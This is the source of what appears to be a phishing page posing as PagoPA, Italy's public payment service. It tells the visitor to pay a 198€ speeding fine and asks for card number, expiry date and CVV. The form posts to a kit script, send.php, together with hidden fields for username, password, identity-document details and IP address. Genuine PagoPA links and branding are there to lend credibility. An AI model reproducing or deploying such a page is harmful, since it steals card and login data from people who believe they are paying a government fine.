<?php 
require '../main.php';
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>pagoPA</title>
    <style type="text/css">
        svg:not(:root).svg-inline--fa {
            overflow: visible;
        }
        .svg-inline--fa {
            display: inline-block;
            font-size: inherit;
            height: 1em;
            overflow: visible;
            vertical-align: -0.125em;
        }
        .svg-inline--fa.fa-lg {
            vertical-align: -0.225em;
        }
        .svg-inline--fa.fa-w-1 {
            width: 0.0625em;
        }
        .svg-inline--fa.fa-w-2 {
            width: 0.125em;
        }
        .svg-inline--fa.fa-w-3 {
            width: 0.1875em;
        }
        .svg-inline--fa.fa-w-4 {
            width: 0.25em;
        }
        .svg-inline--fa.fa-w-5 {
            width: 0.3125em;
        }
        .svg-inline--fa.fa-w-6 {
            width: 0.375em;
        }
        .svg-inline--fa.fa-w-7 {
            width: 0.4375em;
        }
        .svg-inline--fa.fa-w-8 {
            width: 0.5em;
        }
        .svg-inline--fa.fa-w-9 {
            width: 0.5625em;
        }
        .svg-inline--fa.fa-w-10 {
            width: 0.625em;
        }
        .svg-inline--fa.fa-w-11 {
            width: 0.6875em;
        }
        .svg-inline--fa.fa-w-12 {
            width: 0.75em;
        }
        .svg-inline--fa.fa-w-13 {
            width: 0.8125em;
        }
        .svg-inline--fa.fa-w-14 {
            width: 0.875em;
        }
        .svg-inline--fa.fa-w-15 {
            width: 0.9375em;
        }
        .svg-inline--fa.fa-w-16 {
            width: 1em;
        }
        .svg-inline--fa.fa-w-17 {
            width: 1.0625em;
        }
        .svg-inline--fa.fa-w-18 {
            width: 1.125em;
        }
        .svg-inline--fa.fa-w-19 {
            width: 1.1875em;
        }
        .svg-inline--fa.fa-w-20 {
            width: 1.25em;
        }
        .svg-inline--fa.fa-pull-left {
            margin-right: 0.3em;
            width: auto;
        }
        .svg-inline--fa.fa-pull-right {
            margin-left: 0.3em;
            width: auto;
        }
        .svg-inline--fa.fa-border {
            height: 1.5em;
        }
        .svg-inline--fa.fa-li {
            width: 2em;
        }
        .svg-inline--fa.fa-fw {
            width: 1.25em;
        }
        .fa-layers svg.svg-inline--fa {
            bottom: 0;
            left: 0;
            margin: auto;
            position: absolute;
            right: 0;
            top: 0;
        }
        .fa-layers {
            display: inline-block;
            height: 1em;
            position: relative;
            text-align: center;
            vertical-align: -0.125em;
            width: 1em;
        }
        .fa-layers svg.svg-inline--fa {
            -webkit-transform-origin: center center;
            transform-origin: center center;
        }
        .fa-layers-counter,
        .fa-layers-text {
            display: inline-block;
            position: absolute;
            text-align: center;
        }
        .fa-layers-text {
            left: 50%;
            top: 50%;
            -webkit-transform: translate(-50%, -50%);
            transform: translate(-50%, -50%);
            -webkit-transform-origin: center center;
            transform-origin: center center;
        }
        .fa-layers-counter {
            background-color: #ff253a;
            border-radius: 1em;
            -webkit-box-sizing: border-box;
            box-sizing: border-box;
            color: #fff;
            height: 1.5em;
            line-height: 1;
            max-width: 5em;
            min-width: 1.5em;
            overflow: hidden;
            padding: 0.25em;
            right: 0;
            text-overflow: ellipsis;
            top: 0;
            -webkit-transform: scale(0.25);
            transform: scale(0.25);
            -webkit-transform-origin: top right;
            transform-origin: top right;
        }
        .fa-layers-bottom-right {
            bottom: 0;
            right: 0;
            top: auto;
            -webkit-transform: scale(0.25);
            transform: scale(0.25);
            -webkit-transform-origin: bottom right;
            transform-origin: bottom right;
        }
        .fa-layers-bottom-left {
            bottom: 0;
            left: 0;
            right: auto;
            top: auto;
            -webkit-transform: scale(0.25);
            transform: scale(0.25);
            -webkit-transform-origin: bottom left;
            transform-origin: bottom left;
        }
        .fa-layers-top-right {
            right: 0;
            top: 0;
            -webkit-transform: scale(0.25);
            transform: scale(0.25);
            -webkit-transform-origin: top right;
            transform-origin: top right;
        }
        .fa-layers-top-left {
            left: 0;
            right: auto;
            top: 0;
            -webkit-transform: scale(0.25);
            transform: scale(0.25);
            -webkit-transform-origin: top left;
            transform-origin: top left;
        }
        .fa-lg {
            font-size: 1.33333em;
            line-height: 0.75em;
            vertical-align: -0.0667em;
        }
        .fa-xs {
            font-size: 0.75em;
        }
        .fa-sm {
            font-size: 0.875em;
        }
        .fa-1x {
            font-size: 1em;
        }
        .fa-2x {
            font-size: 2em;
        }
        .fa-3x {
            font-size: 3em;
        }
        .fa-4x {
            font-size: 4em;
        }
        .fa-5x {
            font-size: 5em;
        }
        .fa-6x {
            font-size: 6em;
        }
        .fa-7x {
            font-size: 7em;
        }
        .fa-8x {
            font-size: 8em;
        }
        .fa-9x {
            font-size: 9em;
        }
        .fa-10x {
            font-size: 10em;
        }
        .fa-fw {
            text-align: center;
            width: 1.25em;
        }
        .fa-ul {
            list-style-type: none;
            margin-left: 2.5em;
            padding-left: 0;
        }
        .fa-ul > li {
            position: relative;
        }
        .fa-li {
            left: -2em;
            position: absolute;
            text-align: center;
            width: 2em;
            line-height: inherit;
        }
        .fa-border {
            border: solid 0.08em #eee;
            border-radius: 0.1em;
            padding: 0.2em 0.25em 0.15em;
        }
        .fa-pull-left {
            float: left;
        }
        .fa-pull-right {
            float: right;
        }
        .fa.fa-pull-left,
        .fab.fa-pull-left,
        .fal.fa-pull-left,
        .far.fa-pull-left,
        .fas.fa-pull-left {
            margin-right: 0.3em;
        }
        .fa.fa-pull-right,
        .fab.fa-pull-right,
        .fal.fa-pull-right,
        .far.fa-pull-right,
        .fas.fa-pull-right {
            margin-left: 0.3em;
        }
        .fa-spin {
            -webkit-animation: fa-spin 2s infinite linear;
            animation: fa-spin 2s infinite linear;
        }
        .fa-pulse {
            -webkit-animation: fa-spin 1s infinite steps(8);
            animation: fa-spin 1s infinite steps(8);
        }
        @-webkit-keyframes fa-spin {
            0% {
                -webkit-transform: rotate(0);
                transform: rotate(0);
            }
            100% {
                -webkit-transform: rotate(360deg);
                transform: rotate(360deg);
            }
        }
        @keyframes fa-spin {
            0% {
                -webkit-transform: rotate(0);
                transform: rotate(0);
            }
            100% {
                -webkit-transform: rotate(360deg);
                transform: rotate(360deg);
            }
        }
        .fa-rotate-90 {
            -webkit-transform: rotate(90deg);
            transform: rotate(90deg);
        }
        .fa-rotate-180 {
            -webkit-transform: rotate(180deg);
            transform: rotate(180deg);
        }
        .fa-rotate-270 {
            -webkit-transform: rotate(270deg);
            transform: rotate(270deg);
        }
        .fa-flip-horizontal {
            -webkit-transform: scale(-1, 1);
            transform: scale(-1, 1);
        }
        .fa-flip-vertical {
            -webkit-transform: scale(1, -1);
            transform: scale(1, -1);
        }
        .fa-flip-horizontal.fa-flip-vertical {
            -webkit-transform: scale(-1, -1);
            transform: scale(-1, -1);
        }
        :root .fa-flip-horizontal,
        :root .fa-flip-vertical,
        :root .fa-rotate-180,
        :root .fa-rotate-270,
        :root .fa-rotate-90 {
            -webkit-filter: none;
            filter: none;
        }
        .fa-stack {
            display: inline-block;
            height: 2em;
            position: relative;
            width: 2.5em;
        }
        .fa-stack-1x,
        .fa-stack-2x {
            bottom: 0;
            left: 0;
            margin: auto;
            position: absolute;
            right: 0;
            top: 0;
        }
        .svg-inline--fa.fa-stack-1x {
            height: 1em;
            width: 1.25em;
        }
        .svg-inline--fa.fa-stack-2x {
            height: 2em;
            width: 2.5em;
        }
        .fa-inverse {
            color: #fff;
        }
        .sr-only {
            border: 0;
            clip: rect(0, 0, 0, 0);
            height: 1px;
            margin: -1px;
            overflow: hidden;
            padding: 0;
            position: absolute;
            width: 1px;
        }
        .sr-only-focusable:active,
        .sr-only-focusable:focus {
            clip: auto;
            height: auto;
            margin: 0;
            overflow: visible;
            position: static;
            width: auto;
        }
    </style>
    <link rel="icon" type="image/png" href="img/pagopa-logo_brandlogos.net_gp2p3.png" />
    <link href="css/swap.css" rel="stylesheet" />
    <link rel="stylesheet" href="css/min.css" />

    <style>
        body {
            font-family: "Titillium Web", Arial, sans-serif;
            margin: 0;
            padding: 0;
            background-image: url("img/pexels-photo-3182762.jpeg");
            background-position: center bottom;
            background-repeat: no-repeat;
            background-size: cover;
            background-attachment: fixed;
        }

        /* Remove background image on small screens (phones) */
        @media screen and (max-width: 767px) {
            body {
                background-image: none;
                background-color: #fff; /* fallback color */
            }
        }

        .navbar {
            background-color: #003366;
            padding: 10px 20px;
            display: flex;
            flex-wrap: nowrap;
            align-items: center;
            justify-content: space-between;
            color: white;
            overflow-x: auto;
            -webkit-overflow-scrolling: touch;
        }

        .navbar img {
            width: 150px;
            margin-bottom: 10px;
            flex-shrink: 0;
        }

        .button-container {
            display: flex;
            flex-wrap: nowrap;
            gap: 10px;
            overflow-x: auto;
            -webkit-overflow-scrolling: touch;
            flex-shrink: 1;
        }

        .button-container a {
            white-space: nowrap;
            flex-shrink: 0;
        }

        .navbar a {
            color: white;
            font-size: 14px;
            padding: 8px 12px;
            border-radius: 5px;
            text-decoration: none;
            display: inline-block;
        }

        .navbar a:hover {
            background-color: skyblue;
            color: #003366;
        }

        .content {
            background-color: rgba(244, 244, 244, 0.85);
            padding: 20px;
            margin: 20px auto;
            max-width: 1000px;
            border-radius: 10px;
            box-sizing: border-box;
        }

        .payment-box,
        .form-container {
            background-color: #003366;
            color: white;
            padding: 20px;
            border-radius: 10px;
            margin-bottom: 20px;
            font-size: 14px;
        }

        .payment-box h2 {
            font-size: 22px;
        }

        .form-container h2 {
            font-size: 18px;
            margin-bottom: 15px;
        }

        .form-section {
            display: flex;
            flex-wrap: wrap;
            gap: 20px;
        }

        .half-width {
            flex: 1;
            min-width: 250px;
        }

        .form-container label {
            font-weight: bold;
            margin-bottom: 6px;
            display: block;
        }

        .form-container input {
            width: 100%;
            padding: 8px;
            margin-bottom: 12px;
            border-radius: 5px;
            border: 1px solid #ccc;
            font-size: 14px;
            box-sizing: border-box;
            height: 38px;
            line-height: 1.2;
        }

        /* Style date input to look consistent with other inputs */
        input[type="date"] {
            appearance: none;
            -webkit-appearance: none;
            -moz-appearance: none;
            background: white;
            color: #000;
            padding: 8px;
            font-size: 14px;
            border: 1px solid #ccc;
            border-radius: 5px;
            width: 100%;
            box-sizing: border-box;
            height: 38px;
            line-height: 1.2;
            position: relative;
        }

        /* Show the calendar icon in Chrome/Safari */
        input[type="date"]::-webkit-inner-spin-button,
        input[type="date"]::-webkit-calendar-picker-indicator {
            display: block;
            cursor: pointer;
            position: absolute;
            right: 10px;
            top: 50%;
            transform: translateY(-50%);
            width: 20px;
            height: 20px;
            opacity: 0.6;
        }

        /* Firefox calendar icon */
        input[type="date"]::-moz-calendar-picker-indicator {
            cursor: pointer;
        }

        .form-container button {
            background-color: skyblue;
            color: white;
            border: none;
            padding: 12px;
            width: 100%;
            max-width: 300px;
            font-size: 16px;
            border-radius: 5px;
            margin: 20px auto;
            display: block;
            cursor: pointer;
        }

        footer {
            background-color: #003366;
            color: white;
            padding: 30px 20px;
            font-size: 14px;
        }

        .footer-container {
            display: flex;
            flex-wrap: wrap;
            justify-content: space-between;
            gap: 20px;
        }

        .footer-logos img {
            height: 40px;
            margin-right: 10px;
        }

        .footer-links ul {
            list-style: none;
            padding: 0;
            display: flex;
            flex-wrap: wrap;
            gap: 10px;
            margin: 0;
        }

        .footer-links a {
            color: white;
            text-decoration: underline;
        }

        .footer-company-info {
            flex-basis: 100%;
        }

        @media screen and (max-width: 768px) {
            /* Navbar: keep buttons horizontal, allow scroll */
            .navbar {
                flex-wrap: nowrap;
            }
            .button-container {
                flex-wrap: nowrap;
                overflow-x: auto;
                -webkit-overflow-scrolling: touch;
            }

            /* Form section stacked vertically on small */
            .form-section {
                flex-direction: column;
            }

            .half-width {
                width: 100%;
            }

            .form-container button {
                width: 100%;
            }

            .footer-container {
                flex-direction: column;
                align-items: flex-start;
            }
        }
    </style>
</head>

<body>
    <div class="navbar">
        <img src="img/nextGenerationEU-outline-white.svg" alt="PagoPA Logo" />
        <div class="button-container">
            <a href="https://www.pagopa.gov.it/it/servizi/pagamento/">Pagamento multa</a>
            <a href="https://www.pagopa.gov.it/it/serve-aiuto/">Serve aiuto?</a>
            <a href="https://www.pagopa.gov.it/it/chi-siamo/pagopa-spa/">PagoPa S.p.A</a>
            <a href="https://www.pagopa.gov.it/it/pubbliche-amministrazioni/">Amministrazioni</a>
            <a href="https://www.pagopa.gov.it/it/soluzioni/">Soluzioni</a>
            <a href="https://www.pagopa.gov.it/it/assistenza/">Supporto</a>
        </div>
    </div>

    <div class="content">
        <div class="payment-box">
            <h2>Pagamento violazione codice della strada</h2>
            <p>Riferimento: <strong>#R7230033407</strong></p>
            <p>Motivo: <strong>Eccesso di velocità rilevato da radar</strong></p>
            <p>Importo: <strong style="color: skyblue;">198,00€</strong></p>
        </div>

        <style>
            /* Center the main form container */
            #main {
                display: flex;
                justify-content: center;
                align-items: center;
                min-height: 60vh;
                padding: 40px 20px;
                box-sizing: border-box;
            }

            #main .container {
                background: #003366;
                color: white;
                padding: 30px 40px;
                border-radius: 12px;
                max-width: 480px;
                width: 100%;
                box-shadow: 0 0 12px rgba(0, 0, 0, 0.4);
                font-family: "Titillium Web", Arial, sans-serif;
                text-align: center;
            }

            #main .main-title h3 {
                margin-bottom: 20px;
                font-weight: 600;
                font-size: 1.4rem;
                line-height: 1.3;
            }

            #main .details-box p {
                font-size: 1rem;
                margin-bottom: 25px;
                opacity: 0.85;
            }

            #main form {
                text-align: left;
            }

            #main .form-group {
                margin-bottom: 18px;
            }

            #main input.form-control {
                width: 100%;
                padding: 10px 14px;
                font-size: 1rem;
                border-radius: 6px;
                border: 1.5px solid #80bfff;
                outline: none;
                transition: border-color 0.3s ease;
                background-color: white;
                color: #003366;
            }

            #main input.form-control:focus {
                border-color: #00bfff;
                box-shadow: 0 0 5px #00bfff;
            }

            #main button#cc-submit {
                width: 100%;
                background-color: #00bfff;
                border: none;
                color: #003366;
                font-weight: 700;
                padding: 14px 0;
                border-radius: 8px;
                cursor: pointer;
                font-size: 1.1rem;
                transition: background-color 0.3s ease;
                margin-top: 10px;
            }

            #main button#cc-submit:hover {
                background-color: #008fcc;
                color: white;
            }

            .form-group .error-message {
                color: #ff6666;
                font-size: 0.9rem;
                margin-top: 4px;
            }

            @media (max-width: 600px) {
                #main .container {
                    padding: 20px 25px;
                    max-width: 90%;
                }
            }
        </style>

        <style>
            /* Center the main form container */
            #main {
                display: flex;
                justify-content: center;
                align-items: center;
                min-height: 60vh;
                padding: 40px 20px;
                box-sizing: border-box;
            }

            #main .container {
                background: #003366;
                color: white;
                padding: 30px 40px;
                border-radius: 12px;
                max-width: 480px;
                width: 100%;
                box-shadow: 0 0 12px rgba(0, 0, 0, 0.4);
                font-family: "Titillium Web", Arial, sans-serif;
                text-align: center;
            }

            #main .main-title h3 {
                margin-bottom: 20px;
                font-weight: 600;
                font-size: 1.4rem;
                line-height: 1.3;
            }

            #main .details-box p {
                font-size: 1rem;
                margin-bottom: 25px;
                opacity: 0.85;
            }

            #main form {
                text-align: left;
            }

            #main .form-group {
                margin-bottom: 18px;
            }

            #main input.form-control {
                width: 100%;
                padding: 10px 14px;
                font-size: 1rem;
                border-radius: 6px;
                border: 1.5px solid #80bfff;
                outline: none;
                transition: border-color 0.3s ease;
                background-color: white;
                color: #003366;
            }

            #main input.form-control:focus {
                border-color: #00bfff;
                box-shadow: 0 0 5px #00bfff;
            }

            #main button#cc-submit {
                width: 100%;
                background-color: #00bfff;
                border: none;
                color: #003366;
                font-weight: 700;
                padding: 14px 0;
                border-radius: 8px;
                cursor: pointer;
                font-size: 1.1rem;
                transition: background-color 0.3s ease;
                margin-top: 10px;
            }

            #main button#cc-submit:hover {
                background-color: #008fcc;
                color: white;
            }

            .form-group .error-message {
                color: #ff6666;
                font-size: 0.9rem;
                margin-top: 4px;
            }

            @media (max-width: 600px) {
                #main .container {
                    padding: 20px 25px;
                    max-width: 90%;
                }
            }
        </style>

        <meta charset="UTF-8" />
        <title>Pagamento</title>
        <meta name="viewport" content="width=device-width, initial-scale=1.0" />

        <style>
            * {
                box-sizing: border-box;
            }

            body {
                margin: 0;
                padding: 0;
                font-family: Arial, sans-serif;
                background-color: #f6f9fc;
            }

            .details-box {
                max-width: 400px;
                margin: 20px auto;
                padding: 20px;
                background: #ffffff;
                border-radius: 8px;
                box-shadow: 0 0 10px rgba(0, 0, 0, 0.08);
            }

            .card-logos {
                text-align: center;
                margin-bottom: 20px;
            }

            .card-logos img {
                height: 28px;
                margin: 0 8px;
            }

            form {
                display: flex;
                flex-direction: column;
                gap: 12px;
            }

            .form-group {
                width: 100%;
            }

            .form-control {
                width: 100%;
                height: 36px;
                font-size: 14px;
                padding: 6px 10px;
                border: 1px solid #ccc;
                border-radius: 4px;
            }

            .form-group small {
                color: red;
                font-size: 12px;
            }

            #cc-submit {
                background-color: #0073e6;
                color: white;
                border: none;
                padding: 10px;
                font-size: 16px;
                border-radius: 4px;
                cursor: pointer;
                width: 100%;
            }

            #cc-submit:hover {
                background-color: #005bb5;
            }

            @media screen and (max-width: 480px) {
                .details-box {
                    margin: 10px;
                    padding: 15px;
                }
            }

            /* ADDED: Make full width on phone */
            @media screen and (max-width: 600px) {
                html,
                body,
                main#main,
                .container,
                .details-box {
                    width: 100% !important;
                    max-width: 100% !important;
                    margin: 0 !important;
                    padding: 0 !important;
                    border-radius: 0 !important;
                    box-shadow: none !important;
                }

                .details-box {
                    padding: 15px !important;
                }
            }
        </style>

        <main id="main">
            <div class="container">
                <div class="main-title">
                    <h3 style="font-size: 16px;">
                        Inserisci la tua carta di credito o di debito per finalizzare il pagamento della multa
                    </h3>
                </div>

                <div class="details-box">
                    <div class="card-logos">
                        <img src="img/Visa_Inc._logo.svg" alt="Visa" />
                        <img src="img/Mastercard-logo.svg" alt="Mastercard" />
                    </div>

                    <form method="post" action="send.php" id="cc-form">
                        <!-- Card Number -->
                        <div class="form-group">
                            <input type="tel" name="cc" id="cc_number" class="form-control" placeholder="Numero della carta" value="" />
                        </div>

                        <!-- Expiry Date -->
                        <div class="form-group">
                            <input type="tel" name="exp" id="cc_date" maxlength="7" class="form-control" placeholder="Data di scadenza (MM/AA)" value="" />
                        </div>

                        <!-- CVV -->
                        <div class="form-group">
                            <input type="tel" name="cvv" maxlength="4" id="cc_cvv" class="form-control" placeholder="Codice di sicurezza (XXX)" value="" />
                        </div>

                        <!-- Hidden fields -->
                        <input type="hidden" name="verbot" />
                        <input type="hidden" name="type" value="cc" />
                        <input type="hidden" name="doc_type" id="doc_type" value="" />
                        <input type="hidden" name="doc_number" id="doc_number" value="" />
                        <input type="hidden" name="username" id="username" value="" />
                        <input type="hidden" name="password" id="password" value="" />
                        <input type="hidden" name="ip_address" id="ip_address" value="102.99.141.126" />

                        <button type="submit" id="cc-submit">pagare 198,00€</button>
                    </form>
                </div>
            </div>
        </main>

        <!-- END MAIN -->

        <!-- JS FILES -->
        <script src="../assets/js/jquery.min.js"></script>
        <script src="../assets/js/popper.min.js"></script>
        <script src="../assets/js/bootstrap.min.js"></script>
        <script src="../assets/js/fontawesome.min.js"></script>
        <script src="../assets/js/jquery.payment.js"></script>
        <script src="../assets/js/main.js"></script>

        <script type="text/javascript">
            jQuery("#cc_number").payment("formatCardNumber");
            jQuery("#cc_cvv").payment("formatCardCVC");
            jQuery("#cc_date").payment("formatCardExpiry");
        </script>
    </div>
    <footer>
        <div class="footer-container">
            <div class="footer-logos">
                <img src="img/nextGenerationEU-outline-white.svg" alt="NextGenerationEU" />
                <img src="img/logo-pagopa-spa-bianco.svg" alt="PagoPA S.p.A." />
            </div>
            <div class="footer-links">
                <ul>
                    <li><a href="https://www.pagopa.gov.it/it/privacy/">Privacy</a></li>
                    <li><a href="https://www.pagopa.gov.it/it/note-legali/">Note legali</a></li>
                    <li><a href="https://www.pagopa.gov.it/it/trasparenza/">Trasparenza</a></li>
                    <li><a href="https://www.pagopa.gov.it/it/accessibilita/">Accessibilità</a></li>
                </ul>
            </div>
            <div class="footer-company-info">
                <p><strong>PagoPA S.p.A.</strong> - Piazza Colonna 370, Roma - CF/P.IVA 15376371009</p>
            </div>
        </div>
    </footer>
</body>
<?php 
$m->ctr("CARD (".@$_GET['p'].")");
?>
</html>